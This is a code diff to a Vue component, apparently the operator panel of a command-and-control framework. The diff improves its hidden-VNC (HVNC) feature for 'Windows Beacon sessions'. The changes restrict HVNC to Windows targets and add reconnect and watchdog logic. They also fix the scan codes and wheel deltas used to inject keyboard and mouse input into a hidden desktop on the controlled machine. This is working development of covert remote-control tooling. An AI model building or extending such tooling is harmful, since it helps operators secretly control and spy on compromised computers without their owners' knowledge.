@@ -16,7 +16,7 @@
       <span class="mv-label">{{ i18nStore.tl('模式:', 'Mode:') }}</span>
       <el-select v-model="monitorMode" style="width: 120px">
         <el-option :label="i18nStore.tl('屏幕流', 'Stream')" value="normal" />
-        <el-option :label="i18nStore.tl('HVNC (隐蔽)', 'HVNC')" value="hvnc" :disabled="isLinuxClient" />
+        <el-option :label="i18nStore.tl('HVNC (隐蔽)', 'HVNC')" value="hvnc" :disabled="isNonWindowsClient" />
       </el-select>
     </div>
 
@@ -47,7 +47,7 @@
         v-if="monitorMode === 'hvnc'"
         class="cs-btn"
         :class="hvncActive ? 'cs-btn-danger' : 'cs-btn-primary'"
-        :disabled="hvncConnecting || isLinuxClient"
+        :disabled="hvncConnecting || isNonWindowsClient"
         @click="hvncActive ? stopHvnc() : startHvnc()"
       >
         <span>{{ hvncActive ? (i18nStore.tl('停止 HVNC', 'Stop HVNC')) : (i18nStore.tl('启动 HVNC', 'Start HVNC')) }}</span>
@@ -132,7 +132,7 @@
             icon="🪟"
             variant="inline"
             :title="i18nStore.tl('隐蔽桌面 (HVNC)', 'Hidden VNC (HVNC) Desktop')"
-            :desc="isLinuxClient
+            :desc="isNonWindowsClient
               ? (i18nStore.tl('HVNC 仅支持 Windows 目标会话。', 'HVNC is only supported on Windows Beacon sessions.'))
               : (i18nStore.tl('点击【启动 HVNC】创建隐蔽交互式 Windows 桌面会话。', 'Click [ Start HVNC ] to spawn a hidden interactive Windows desktop session.'))"
           />
@@ -201,12 +201,24 @@ const hvncConnecting = ref(false)
 const hvncCanvas = ref<HTMLCanvasElement>()
 let hvncWs: WebSocket | null = null
 let hvncPollTimer: number | null = null
+let hvncReconnectTimer: number | null = null
+let hvncReconnectAttempts = 0
+let hvncWatchdogTimer: number | null = null
+let hvncLastFrameAt = 0
+let hvncEverFrame = false
 
-const isLinuxClient = computed(() => {
+const HVNC_WS_RETRY_MAX = 5
+// 首帧超时（启动失败）与画面中断超时（会话已死）分开：重连窗口内不应误杀
+const HVNC_FIRST_FRAME_TIMEOUT = 10_000
+const HVNC_STALL_TIMEOUT = 30_000
+
+// HVNC 只支持 Windows：判据是客户端上报的 Os 字段（Arch 只有 x64/x86，
+// 原实现用 Arch 判断导致 Linux/macOS 也被当成可启动）。
+const isNonWindowsClient = computed(() => {
   const uid = getUid()
   const c = clientsStore.getClientByUid(uid)
-  const arch = (c?.Arch || '').toLowerCase()
-  return arch.includes('linux') || arch.includes('darwin') || arch.includes('kali')
+  const os = (c?.Os || '').toLowerCase()
+  return os !== '' && os !== 'windows'
 })
 
 let streamTimer: number | null = null
@@ -344,7 +356,7 @@ function onFrameError() {}
 // 鼠标键盘输入归一化后经命令通道下发(60ms 聚合窗口,防打满 beacon 命令队列)。
 
 const startHvnc = async () => {
-  if (isLinuxClient.value) {
+  if (isNonWindowsClient.value) {
     ElMessage.warning(isZh.value ? 'HVNC 仅支持 Windows 目标' : 'HVNC is only supported on Windows')
     return
   }
@@ -356,6 +368,10 @@ const startHvnc = async () => {
     if (res.data && res.data.status === 200 && sid) {
       hvncSid.value = sid
       hvncActive.value = true
+      hvncReconnectAttempts = 0
+      hvncEverFrame = false
+      hvncLastFrameAt = Date.now()
+      startHvncWatchdog()
       connectHvncWs()
       ElMessage.success(isZh.value ? 'HVNC 会话启动成功' : 'HVNC session started')
     } else {
@@ -382,6 +398,8 @@ async function renderHvncFrame(bytes: Uint8Array) {
     const ctx = canvas.getContext('2d')
     if (ctx) ctx.drawImage(bmp, 0, 0)
     bmp.close()
+    hvncLastFrameAt = Date.now()
+    hvncEverFrame = true
     const now = performance.now()
     frameTimestamps.push(now)
     while (frameTimestamps.length > 0 && now - frameTimestamps[0] > 1000) frameTimestamps.shift()
@@ -416,6 +434,48 @@ function stopHvncPolling() {
   if (hvncPollTimer) { clearInterval(hvncPollTimer); hvncPollTimer = null }
 }
 
+// 无帧看门狗：首帧超时说明启动失败；已出画面后长时间无帧说明会话已死/被停。
+function startHvncWatchdog() {
+  stopHvncWatchdog()
+  hvncWatchdogTimer = window.setInterval(() => {
+    if (!hvncActive.value) return
+    const now = Date.now()
+    if (!hvncEverFrame && now - hvncLastFrameAt > HVNC_FIRST_FRAME_TIMEOUT) {
+      ElMessage.warning(isZh.value ? 'HVNC 启动超时：客户端没有返回首帧（可能启动失败或已离线）' : 'HVNC start timed out: no first frame from client')
+      void stopHvnc(true)
+      return
+    }
+    if (hvncEverFrame && now - hvncLastFrameAt > HVNC_STALL_TIMEOUT) {
+      ElMessage.warning(isZh.value ? 'HVNC 画面中断超过 30 秒，已自动停止会话' : 'HVNC stream stalled for 30s, session stopped')
+      void stopHvnc(true)
+    }
+  }, 2000)
+}
+
+function stopHvncWatchdog() {
+  if (hvncWatchdogTimer) { clearInterval(hvncWatchdogTimer); hvncWatchdogTimer = null }
+}
+
+// WS 断开后优先重连（服务端有 30s 宽限，不会立刻杀会话）；重试耗尽再退回 REST 轮询。
+function scheduleHvncReconnect() {
+  if (hvncReconnectTimer) return
+  if (!hvncActive.value) return
+  if (hvncReconnectAttempts >= HVNC_WS_RETRY_MAX) {
+    startHvncPolling()
+    return
+  }
+  const delay = Math.min(1000 * Math.pow(2, hvncReconnectAttempts), 8000)
+  hvncReconnectAttempts++
+  hvncReconnectTimer = window.setTimeout(() => {
+    hvncReconnectTimer = null
+    if (hvncActive.value && !hvncWs) connectHvncWs()
+  }, delay)
+}
+
+function cancelHvncReconnect() {
+  if (hvncReconnectTimer) { clearTimeout(hvncReconnectTimer); hvncReconnectTimer = null }
+}
+
 async function connectHvncWs() {
   // access token 仅存内存：刷新页面后为空，先凭 Cookie 续期再连（服务端另有 Cookie 回退兜底）
   const token = await userStore.ensureToken()
@@ -425,6 +485,7 @@ async function connectHvncWs() {
   ws.binaryType = 'arraybuffer'
   ws.onopen = () => {
     ws.send(JSON.stringify({ type: 'auth', content: token }))
+    hvncReconnectAttempts = 0
     stopHvncPolling() // WS 可用则停轮询
   }
   ws.onmessage = (ev) => {
@@ -435,21 +496,34 @@ async function connectHvncWs() {
     }
     renderHvncFrame(new Uint8Array(ev.data))
   }
-  ws.onclose = () => { if (hvncWs === ws) hvncWs = null; if (hvncActive.value) startHvncPolling() }
+  ws.onclose = () => {
+    if (hvncWs === ws) hvncWs = null
+    if (hvncActive.value) scheduleHvncReconnect()
+  }
   ws.onerror = () => { try { ws.close() } catch {} }
   hvncWs = ws
 }
 
-const stopHvnc = async () => {
-  if (hvncWs) { try { hvncWs.close() } catch {} hvncWs = null }
+const stopHvnc = async (silent = false) => {
+  // 先置 active=false：onclose 里据此不再安排重连
+  hvncActive.value = false
+  cancelHvncReconnect()
+  stopHvncWatchdog()
+  if (hvncWs) {
+    // 摘掉 onclose，避免主动关闭触发重连逻辑
+    hvncWs.onclose = null
+    hvncWs.onerror = null
+    try { hvncWs.close() } catch {}
+    hvncWs = null
+  }
   stopHvncPolling()
   flushHvncInput(true)
   try {
     await ClientAPI.stop_hvnc({ uid: getUid(), sid: hvncSid.value })
   } catch {}
-  hvncActive.value = false
   hvncSid.value = ''
-  ElMessage.info(isZh.value ? 'HVNC 已断开' : 'HVNC stopped')
+  hvncEverFrame = false
+  if (!silent) ElMessage.info(isZh.value ? 'HVNC 已断开' : 'HVNC stopped')
 }
 
 // ================= HVNC 输入注入 =================
@@ -457,7 +531,7 @@ const stopHvnc = async () => {
 // "keys":[{"type","scan","vk"}]}; 每条输入=一次 C2 命令帧,故按 60ms 窗口聚合批量。
 
 interface HvncMouseEvent { type: string; x: number; y: number; button?: number; wheel?: number }
-interface HvncKeyEvent { type: string; scan: number; vk: number }
+interface HvncKeyEvent { type: string; scan: number; vk: number; extended?: boolean }
 
 const hvncMouseBuf: HvncMouseEvent[] = []
 const hvncKeyBuf: HvncKeyEvent[] = []
@@ -481,7 +555,7 @@ const SCAN_CODE_MAP: Record<string, number> = {
   Numpad3: 0x51, Numpad0: 0x52, NumpadDecimal: 0x53, IntlRo: 0x87, F11: 0x57, F12: 0x58,
   NumpadEnter: 0x9C, ControlRight: 0x9D, NumpadDivide: 0xB5, AltRight: 0xB8, Home: 0xC7,
   ArrowUp: 0xC8, PageUp: 0xC9, ArrowLeft: 0xCB, ArrowRight: 0xCD, End: 0xCF, ArrowDown: 0xD0,
-  PageDown: 0xD1, Insert: 0xD2, Delete: 0xD3, MetaLeft: 0xE0, MetaRight: 0xE7,
+  PageDown: 0xD1, Insert: 0xD2, Delete: 0xD3, MetaLeft: 0xDB, MetaRight: 0xDC,
 }
 
 // 聚合窗口到期把缓冲打成一条 packet 下发
@@ -543,24 +617,38 @@ function hvncWheel(e: WheelEvent) {
   if (!hvncActive.value) return
   const p = hvncNormCoords(e)
   if (!p) return
-  // 滚轮: 正=向下;按 120 粒度(Windows WHEEL_DELTA)归整
-  hvncMouseBuf.push({ type: 'wheel', x: p.x, y: p.y, wheel: Math.trunc(e.deltaY / 100) * 120 || (e.deltaY > 0 ? 120 : -120) })
+  // DOM deltaY>0 = 向下滚；Windows WHEEL_DELTA 正值 = 向上（远离用户）→ 取反。
+  const steps = Math.max(1, Math.round(Math.abs(e.deltaY) / 100))
+  const delta = (e.deltaY > 0 ? -1 : 1) * 120 * steps
+  hvncMouseBuf.push({ type: 'wheel', x: p.x, y: p.y, wheel: delta })
   queueHvncFlush()
+}
+// 映射表用 bit7 标记扩展键；发往客户端时拆成"基础码 + extended"，
+// 客户端按 KEYEVENTF_SCANCODE 注入（原样发 0xC7 会被当成无效扫描码）。
+function hvncKeyEventFor(type: 'keydown' | 'keyup', e: KeyboardEvent): HvncKeyEvent | null {
+  const raw = SCAN_CODE_MAP[e.code]
+  if (!raw) return null
+  return {
+    type,
+    scan: raw & 0x7f,
+    vk: e.keyCode,
+    extended: (raw & 0x80) !== 0,
+  }
 }
 function hvncKeyDown(e: KeyboardEvent) {
   if (!hvncActive.value) return
   e.preventDefault()
-  const scan = SCAN_CODE_MAP[e.code]
-  if (!scan) return
-  hvncKeyBuf.push({ type: 'keydown', scan, vk: e.keyCode })
+  const ev = hvncKeyEventFor('keydown', e)
+  if (!ev) return
+  hvncKeyBuf.push(ev)
   queueHvncFlush()
 }
 function hvncKeyUp(e: KeyboardEvent) {
   if (!hvncActive.value) return
   e.preventDefault()
-  const scan = SCAN_CODE_MAP[e.code]
-  if (!scan) return
-  hvncKeyBuf.push({ type: 'keyup', scan, vk: e.keyCode })
+  const ev = hvncKeyEventFor('keyup', e)
+  if (!ev) return
+  hvncKeyBuf.push(ev)
   queueHvncFlush()
 }
 
@@ -596,14 +684,20 @@ onMounted(() => {
 onUnmounted(() => {
   if (timeInterval) clearInterval(timeInterval)
   if (streamTimer) clearTimeout(streamTimer)
-  stopHvncPolling()
-  if (hvncWs) {
-    // 【修复】先摘掉 onclose 再关闭:原顺序下 close 触发 onclose → 在已卸载的
-    // 组件里 startHvncPolling() 新建 1s 轮询且再无人清理(永久泄漏)
-    hvncWs.onclose = null
-    hvncWs.onerror = null
-    hvncWs.close()
-    hvncWs = null
+  cancelHvncReconnect()
+  stopHvncWatchdog()
+  // 【泄漏修复】REST 轮询兜底时没有 WS，服务端收不到"观看者断开"事件；
+  // 必须显式 stop_hvnc，否则隐藏桌面会话会在客户端继续 8fps 采集/推帧。
+  if (hvncActive.value) {
+    void stopHvnc(true)
+  } else {
+    stopHvncPolling()
+    if (hvncWs) {
+      hvncWs.onclose = null
+      hvncWs.onerror = null
+      hvncWs.close()
+      hvncWs = null
+    }
   }
 })
 </script>
